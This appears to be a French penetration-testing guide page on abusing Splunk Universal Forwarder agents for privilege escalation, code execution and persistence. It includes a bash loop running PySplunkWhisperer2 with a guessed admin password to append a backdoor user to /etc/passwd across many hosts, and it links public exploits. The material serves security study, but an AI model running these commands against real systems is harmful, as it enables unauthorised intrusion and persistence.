# Splunk LPE et Persistance

{{#include ../../banners/hacktricks-training.md}}

Si vous **énumérez** une machine **en interne** ou **en externe** et que vous trouvez **Splunk en cours d'exécution** (port 8090), si vous avez la chance de connaître des **identifiants valides**, vous pouvez **exploiter le service Splunk** pour **exécuter un shell** en tant qu'utilisateur exécutant Splunk. Si root l'exécute, vous pouvez élever les privilèges à root.

De plus, si vous êtes **déjà root et que le service Splunk n'écoute pas uniquement sur localhost**, vous pouvez **voler** le fichier **de mot de passe** **du** service Splunk et **craquer** les mots de passe, ou **ajouter de nouveaux** identifiants. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page web Splunkd.

## Résumé de l'Exploitation de l'Agent Splunk Universal Forwarder

Pour plus de détails, consultez le post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci est juste un résumé :

**Aperçu de l'Exploitation :**
Une exploitation ciblant l'Agent Splunk Universal Forwarder (UF) permet aux attaquants disposant du mot de passe de l'agent d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement un réseau entier.

**Points Clés :**

- L'agent UF ne valide pas les connexions entrantes ni l'authenticité du code, ce qui le rend vulnérable à l'exécution non autorisée de code.
- Les méthodes courantes d'acquisition de mots de passe incluent leur localisation dans des répertoires réseau, des partages de fichiers ou de la documentation interne.
- Une exploitation réussie peut conduire à un accès au niveau SYSTEM ou root sur des hôtes compromis, à l'exfiltration de données et à une infiltration réseau supplémentaire.

**Exécution de l'Exploitation :**

1. L'attaquant obtient le mot de passe de l'agent UF.
2. Utilise l'API Splunk pour envoyer des commandes ou des scripts aux agents.
3. Les actions possibles incluent l'extraction de fichiers, la manipulation de comptes utilisateurs et la compromission du système.

**Impact :**

- Compromission complète du réseau avec des permissions au niveau SYSTEM/root sur chaque hôte.
- Potentiel de désactivation des journaux pour échapper à la détection.
- Installation de portes dérobées ou de ransomwares.

**Commande Exemple pour l'Exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Abus des requêtes Splunk

**Pour plus de détails, consultez le post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
